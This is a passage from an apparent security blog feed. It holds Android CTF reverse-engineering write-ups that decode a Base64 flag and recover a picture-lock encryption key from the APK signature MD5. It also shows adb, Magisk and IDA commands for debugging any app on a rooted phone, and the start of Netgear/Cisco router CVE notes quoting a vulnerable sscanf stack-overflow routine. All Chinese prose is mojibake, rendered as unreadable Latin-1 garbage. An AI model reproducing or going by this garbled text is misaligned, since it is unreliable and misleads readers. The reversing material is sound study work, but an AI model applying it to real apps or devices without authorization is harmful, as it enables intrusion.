class="line">ZmxhZ3tJU0NDSkFWQU5ES1lYWH0=</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨è¿›å…¥checkFlagä¹‹å‰ï¼Œè¿˜å¯¹å…¶è¿›è¡Œäº†ç¼–ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package org.isclab.iscc;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;Util/Digest&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> String str = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">encode</span><span class="params">(String srcStr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (srcStr != null &amp;&amp; srcStr.<span class="built_in">length</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] srcStrCh = srcStr.<span class="built_in">toCharArray</span>();</span><br><span class="line">            StringBuilder asciiBinStrB = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : srcStrCh) &#123;</span><br><span class="line">                String asciiBin = Integer.<span class="built_in">toBinaryString</span>(c);</span><br><span class="line">                <span class="keyword">while</span> (asciiBin.<span class="built_in">length</span>() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    asciiBin = <span class="string">&quot;0&quot;</span> + asciiBin;</span><br><span class="line">                &#125;</span><br><span class="line">                asciiBinStrB.<span class="built_in">append</span>(asciiBin);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (asciiBinStrB.<span class="built_in">length</span>() % <span class="number">6</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                asciiBinStrB.<span class="built_in">append</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            String asciiBinStr = String.<span class="built_in">valueOf</span>(asciiBinStrB);</span><br><span class="line">            <span class="type">char</span>[] codeCh = <span class="keyword">new</span> <span class="type">char</span>[asciiBinStr.<span class="built_in">length</span>() / <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; codeCh.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> index = Integer.<span class="built_in">parseInt</span>(asciiBinStr.<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">                asciiBinStr = asciiBinStr.<span class="built_in">substring</span>(<span class="number">6</span>);</span><br><span class="line">                codeCh[i] = str.<span class="built_in">charAt</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">            StringBuilder code = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>(String.<span class="built_in">valueOf</span>(codeCh));</span><br><span class="line">            <span class="keyword">if</span> (srcStr.<span class="built_in">length</span>() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                code.<span class="built_in">append</span>(<span class="string">&quot;==&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (srcStr.<span class="built_in">length</span>() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                code.<span class="built_in">append</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">76</span>; i2 &lt; code.<span class="built_in">length</span>(); i2 += <span class="number">76</span>) &#123;</span><br><span class="line">                code.<span class="built_in">insert</span>(i2, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            code.<span class="built_in">append</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> String.<span class="built_in">valueOf</span>(code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æï¼Œå¯ä»¥å‘ç°æ˜¯æ ‡å‡†base64ï¼Œå°±ä¸ç”¨è‡ªå·±å†™è„šæœ¬äº†ï¼Œcyberchefå¾—åˆ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ISCCJAVANDKYXX&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><h2 id="2018-å¼ºç½‘æ¯-picture-lock"><a href="#2018-å¼ºç½‘æ¯-picture-lock" class="headerlink" title="2018 å¼ºç½‘æ¯ picture lock"></a>2018 å¼ºç½‘æ¯ picture lock</h2><p>åœ¨androidä¸­ï¼Œ<code>onActivityResult</code>æ˜¯ä¸€ä¸ª<code>android.app.Activity</code>ç±»é¢„å…ˆå®šä¹‰å¥½çš„å›è°ƒå‡½æ•°ï¼Œåªæœ‰å½“å†…éƒ¨æ–¹æ³•è°ƒç”¨<code>startActivityForResult(Intent intent, int requestCode)</code>æ¥å¯åŠ¨å¦ä¸€ä¸ªActivityçš„æ—¶å€™æ‰ä¼šè°ƒç”¨è¿™ä¸ªå›è°ƒå‡½æ•°ï¼Œè¢«å¯åŠ¨çš„Activityå¿…é¡»åœ¨ç»“æŸå‰è°ƒç”¨setResultæ¥è®¾ç½®è¿”å›ç»“æœå’Œfinishæ¥å…³é—­è‡ªå·±ï¼Œå…³é—­å®Œä¹‹ååŸActivityå°±ä¼šè°ƒç”¨<code>onActivityResult</code>æ–¹æ³•ï¼Œå¹¶å°†ä¹‹å‰å¯åŠ¨çš„Activityçš„resultCodeå’Œintentä»¥åŠä¸€å¼€å§‹è°ƒç”¨æ–°Activityä¼ å…¥çš„requestCodeä¸€èµ·ä¼ å…¥<code>onActivityResult</code></p><p>MediaStoreå†…å®¹æä¾›å™¨ä¸­ï¼Œ<code>_data</code>ä»£è¡¨ç»å¯¹è·¯å¾„</p><p><strong>é€†å‘åˆ†æï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">j</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="comment">// è·å–è¯¥åŒ…çš„ç­¾åä¿¡æ¯</span></span><br><span class="line">        Signature[] signatureArr = getPackageManager().getPackageInfo(<span class="string">&quot;com.a.sample.picturelock&quot;</span>, <span class="number">64</span>).signatures; <span class="comment">// è·å–è¯¥åŒ…çš„ç­¾åä¿¡æ¯</span></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>); <span class="comment">// åˆå§‹åŒ–MD5è®¡ç®—å™¨</span></span><br><span class="line">        <span class="keyword">for</span> (Signature signature : signatureArr) &#123;</span><br><span class="line">            messageDigest.update(signature.toByteArray()); <span class="comment">// éå†æ‰€æœ‰ç­¾åå¹¶æ›´æ–°å“ˆå¸Œå€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] digest = messageDigest.digest(); <span class="comment">// æœ€ç»ˆmd5å“ˆå¸Œ</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : digest) &#123; <span class="comment">// å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(Integer.toHexString(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString(); <span class="comment">// è¿”å›string</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException | NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v4.a.k, android.app.Activity</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2, Intent intent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(i, i2, intent);</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">                String[] strArr = &#123;<span class="string">&quot;_data&quot;</span>&#125;;</span><br><span class="line">                <span class="type">Cursor</span> <span class="variable">query</span> <span class="operator">=</span> getContentResolver().query(intent.getData(), strArr, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                query.moveToFirst();</span><br><span class="line">                <span class="type">String</span> <span class="variable">file_path</span> <span class="operator">=</span> query.getString(query.getColumnIndex(strArr[<span class="number">0</span>])); <span class="comment">// æºæ–‡ä»¶è·¯å¾„</span></span><br><span class="line">                query.close();</span><br><span class="line">                enc(file_path, getFilesDir().getAbsolutePath() + file_path.substring(file_path.lastIndexOf(<span class="string">&quot;/&quot;</span>)) + <span class="string">&quot;.lock&quot;</span>, j());</span><br><span class="line">                i();</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, String.format(<span class="string">&quot;%s encrypting&quot;</span>, file_path), <span class="number">1</span>).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v7.app.c, android.support.v4.a.k, android.app.Activity</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    findViewById(R.id.encrypt).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.sample.picturelock.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.a(<span class="built_in">this</span>, <span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123; <span class="comment">// åˆ¤æ–­æ˜¯å¦æœ‰å†™å…¥å¤–éƒ¨å­˜å‚¨æƒé™</span></span><br><span class="line">                android.support.v4.a.a.a((Activity) <span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.PICK&quot;</span>, (Uri) <span class="literal">null</span>); <span class="comment">// åŠ¨ä½œ</span></span><br><span class="line">            intent.setDataAndType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, <span class="string">&quot;image/*&quot;</span>); <span class="comment">// é—´æ¥è°ƒç”¨äº†MediaStoreå†…å®¹æä¾›å™¨</span></span><br><span class="line">            MainActivity.<span class="built_in">this</span>.startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    findViewById(R.id.refresh).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.sample.picturelock.MainActivity.2</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            MainActivity.<span class="built_in">this</span>.i();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    i();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹nativeå±‚çš„encå‡½æ•° å‚æ•°(æ–‡ä»¶çš„çœŸå®è·¯å¾„ï¼Œç›®æ ‡è·¯å¾„ï¼Œæ–‡ä»¶ç­¾åçš„md5)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥hookçœ‹ä¸€çœ¼å³å¯å¾—åˆ°ï¼š<code>f8c49056e4ccf9a11e090eaf471f418d</code></p><p>ä¸hookä¹Ÿå¯ä»¥ç›´æ¥å¾—åˆ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PS D:\android_re\CTF\wiki\picture&gt; apksigner verify --verbose --print-certs picturelock.<span class="function">apk</span></span><br><span class="line"><span class="function">Verifies</span></span><br><span class="line"><span class="function">Verified <span class="keyword">using</span> v1 <span class="title">scheme</span> <span class="params">(JAR signing)</span>: true</span></span><br><span class="line"><span class="function">Verified using v2 scheme (APK Signature Scheme v2): true</span></span><br><span class="line"><span class="function">Verified using v3 scheme (APK Signature Scheme v3): false</span></span><br><span class="line"><span class="function">Verified using v3<span class="number">.1</span> scheme (APK Signature Scheme v3<span class="number">.1</span>): false</span></span><br><span class="line"><span class="function">Verified using v4 scheme (APK Signature Scheme v4): false</span></span><br><span class="line"><span class="function">Verified for SourceStamp: false</span></span><br><span class="line"><span class="function">Number of signers: <span class="number">1</span></span></span><br><span class="line"><span class="function">Signer #<span class="number">1</span> certificate DN: CN=</span>a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">Signer #<span class="number">1</span> certificate SHA<span class="number">-256</span> digest: ba12c13fd60e0def17ae3aee4e6a816782d0367ff02e37ccad5d6e86870c8e38</span><br><span class="line">Signer #<span class="number">1</span> certificate SHA<span class="number">-1</span> digest: <span class="number">48e7045</span>ee60d9d8a257c5275e3650609a5cca13e</span><br><span class="line">Signer #<span class="number">1</span> certificate MD5 digest: f8c49056e4ccf9a11e090eaf471f418d</span><br><span class="line">Signer #<span class="number">1</span> key algorithm: RSA</span><br><span class="line">Signer #<span class="number">1</span> key <span class="built_in">size</span> (bits): <span class="number">2048</span></span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key SHA<span class="number">-256</span> digest: <span class="number">4</span>de55872bc804bf5fccc61c6e42377b24cd6eefc183a800c5807f759f7f9796d</span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key SHA<span class="number">-1</span> digest: dba8196f6f49a1d1291e4c03102bc7225b6f1f25</span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key MD5 digest: d246e0ae52179dfe9daca889ee3133ef</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>Signer #1 certificate MD5 digest: f8c49056e4ccf9a11e090eaf471f418d</code>å°±èƒ½å¾—åˆ°</p><p>soç¨‹åºçš„encç¨‹åºåœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œè€æ˜¯å‡ºç°é”™è¯¯ï¼Œå› æ­¤å°±åœ¨æ­¤ç•™ä¸‹ä¸€ä¸ªå°å‘å§ï¼Œç­‰æˆ‘å˜å¼ºä¹‹åå†å›æ¥æå®šğŸ˜</p><h1 id="androidé€†å‘ä¹‹åŠ¨æ€è°ƒè¯•"><a href="#androidé€†å‘ä¹‹åŠ¨æ€è°ƒè¯•" class="headerlink" title="androidé€†å‘ä¹‹åŠ¨æ€è°ƒè¯•"></a>androidé€†å‘ä¹‹åŠ¨æ€è°ƒè¯•</h1><h2 id="javaå±‚è°ƒè¯•"><a href="#javaå±‚è°ƒè¯•" class="headerlink" title="javaå±‚è°ƒè¯•"></a>javaå±‚è°ƒè¯•</h2><p>å·¥å…·ï¼šandroid studioã€apktoolsã€smalideaã€å·²ç»rootçš„æ‰‹æœº</p><p>é¦–å…ˆapktoolsåç¼–è¯‘apkä¸ºoutput</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk -o output</span><br></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell #adbè¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼</span><br><span class="line">su #åˆ‡æ¢è‡³è¶…çº§ç”¨æˆ·</span><br><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line">stop</span><br><span class="line">start #ä¸€å®šè¦é€šè¿‡è¯¥æ–¹å¼é‡å¯</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ‰‹æœºçš„ro.debuggableä¸º1ï¼Œè¿™æ ·ä»»ä½•ç¨‹åºéƒ½å¯ä»¥åœ¨æˆ‘ä»¬çš„æ‰‹æœºä¸Šè¿›è¡Œè°ƒè¯•ï¼ˆä½†æ˜¯ç¼ºç‚¹å°±æ˜¯æ¯æ¬¡é‡å¯éƒ½ä¼šå¤±æ•ˆï¼Œå› æ­¤åœ¨å¯åŠ¨ä¹‹åéƒ½è¦è®¾ç½®ä¸€æ¬¡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°å¯¹åº”çš„è°ƒè¯•è¿›ç¨‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u0_a137       9261  7805 1120068  56804 SyS_epoll_wait      0 S com.a.sample.picturelock</span><br></pre></td></tr></table></figure><p>PIDä¸º9261</p><p>å› æ­¤è®¾ç½®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Lenovo&gt; adb forward tcp:<span class="number">8700</span> jdwp:<span class="number">9261</span></span><br><span class="line"><span class="number">8700</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª8700æ˜¯android studioä¸­è®¾ç½®çš„</p><p>æ¥åˆ°android studioä¸­</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456734.png" alt="image-20250414101310778" style="zoom: 33%;" /><p>è®¾ç½®å¦‚ä¸Šçš„éƒ¨åˆ†ï¼Œoutputæ˜¯apktoolåç¼–è¯‘apkä¸ºsmaliçš„æ–‡ä»¶ï¼Œå…¶ä¸­outputä¸­çš„smaliæ–‡ä»¶å¤¹è¦å°†å…¶Markä¸ºSources Rootæƒé™</p><p>ä¹‹åç›´æ¥åˆ°outputä¸­è¿›è¡Œè°ƒè¯•å³å¯</p><h2 id="åŸç”Ÿå±‚è°ƒè¯•"><a href="#åŸç”Ÿå±‚è°ƒè¯•" class="headerlink" title="åŸç”Ÿå±‚è°ƒè¯•"></a>åŸç”Ÿå±‚è°ƒè¯•</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.a.sample.picturelock/.MainActivity</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨adb shellä¸­pushè¿›å»ida&#x2F;dbgsrvä¸‹å¯¹åº”çš„serverï¼Œè¿è¡Œï¼Œè‡ªåŠ¨ç›‘å¬ 23946 port</p><p>ç„¶å</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></span><br></pre></td></tr></table></figure><p>å°†PCç«¯çš„ç«¯å£è½¬å‘åˆ°æ‰‹æœºä¸Šå¯¹åº”çš„æœåŠ¡ç«¯å£</p><p>ä¹‹åida</p><p><code>Debug-&gt;attach-&gt;localhost:23946</code></p><p>é€‰ä¸­å¯¹åº”çš„æœåŠ¡å³æˆåŠŸattackä¸Š</p><p>ç„¶åandroid studioä¹Ÿattachä¸Šjavaå±‚å³å¯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é™æ€åˆ†æjavaå±‚&quot;&gt;&lt;a href=&quot;#é™æ€åˆ†æjavaå±‚&quot; class=&quot;headerlink&quot; title=&quot;é™æ€åˆ†æjavaå±‚&quot;&gt;&lt;/a&gt;é™æ€åˆ†æjavaå±‚&lt;/h1&gt;&lt;h2 id=&quot;2014-ASIS-Cyber-Security-Contest-Fina</summary>
      
    
    
    
    <category term="å®‰å“é€†å‘" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€äº›IoTæ¼æ´å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-04-06T14:45:13.000Z</published>
    <updated>2025-04-06T15:49:48.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°"><a href="#ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°" class="headerlink" title="ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°"></a>ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€äº›æ¼æ´çš„å­¦ä¹ ç¬”è®°ï¼Œæ¯”è¾ƒçš„æ½¦è‰ï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹ğŸ˜ŠğŸ˜ŠğŸ˜ŠğŸ˜Š</p><h2 id="CVE-2024-52028"><a href="#CVE-2024-52028" class="headerlink" title="CVE-2024-52028"></a><a href="https://www.cve.org/CVERecord?id=CVE-2024-52028">CVE-2024-52028</a></h2><p>Netgear R7000P v1.3.3.154 è¢«å‘ç°é€šè¿‡ wiz_pptp.cgi ä¸Šçš„ pptp_user_netmask å‚æ•°å­˜åœ¨å †æ ˆæº¢å‡ºã€‚æ­¤æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„ POST è¯·æ±‚å¼•å‘æ‹’ç»æœåŠ¡ (DoS)ã€‚</p><p>å›ºä»¶é“¾æ¥ï¼š<a href="https://www.netgear.com/support/product/r7000p/#download">https://www.netgear.com/support/product/r7000p/#download</a></p><p>usr&#x2F;sbin&#x2F;httpd</p><p>æ²¡æ‰¾åˆ°ï¼</p><p>Netgear XR300 v1.0.3.78ã€R7000P v1.3.3.154 å’Œ R6400 v2 1.0.4.128 è¢«å‘ç°é€šè¿‡ bsw_pppoe.cgi çš„ pppoe_localip å‚æ•°åŒ…å«å †æ ˆæº¢å‡ºã€‚æ­¤æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„ POST è¯·æ±‚å¼•å‘æ‹’ç»æœåŠ¡ (DoS)ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">case 4:</span><br><span class="line">  if ( input_length &gt; *limits )</span><br><span class="line">    return -1;</span><br><span class="line">  for ( check_index2 = 0; check_index2 &lt; input_length; ++check_index2 )</span><br><span class="line">  &#123;</span><br><span class="line">    char_code4 = (unsigned __int8)input_str[check_index2];</span><br><span class="line">    is_invalid_number4 = char_code4 &gt; &#x27;.&#x27;;</span><br><span class="line">    if ( char_code4 != &#x27;.&#x27; )</span><br><span class="line">      is_invalid_number4 = (unsigned __int8)(char_code4 - &#x27;0&#x27;) &gt; 9u;</span><br><span class="line">    if ( is_invalid_number4 )</span><br><span class="line">      return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  sscanf(input_str, &quot;%[^.].%[^.].%[^.].%s&quot;, ip_buffer1, ip_buffer2, ip_buffer3, ip_buffer4); </span><br><span class="line">    //æ ˆæº¢å‡º</span><br><span class="line">  if ( !ip_buffer1[0] )</span><br><span class="line">    return -1;</span><br><span class="line">  if ( strlen(ip_buffer1) &gt; 3 )</span><br><span class="line">    return -1;</span><br></pre></td></tr></table></figure><p><code>input_str</code>æœ€å¤§é•¿åº¦ä¸º2048ï¼Œä½†æ˜¯<code>ip_buffer1-4</code>çš„é•¿åº¦éƒ½å¾ˆå°ï¼Œä¸”æ²¡æœ‰å¼€å§‹çš„åˆ¤æ–­ï¼Œæ•°å­—çš„æº¢å‡ºDos</p><h2 id="CVE-2022-20705"><a href="#CVE-2022-20705" class="headerlink" title="CVE-2022-20705"></a>CVE-2022-20705</h2><p><strong>RV340çš„ç¯å¢ƒæ­å»ºï¼š</strong>ä»æŠ¥é”™å‡ºå‘ï¼Œå°è¯•è§£å†³å½±å“è¾ƒå¤§çš„æŠ¥é”™ï¼Œè¾…ä»¥è°ƒè¯•æˆ–è€…å¯»æ‰¾èµ„æ–™<strong><a href="https://www.yuque.com/cyberangel/rg9gdm/zz75e4">https://www.yuque.com/cyberangel/rg9gdm/zz75e4</a></strong></p><p>Cisco Small Business 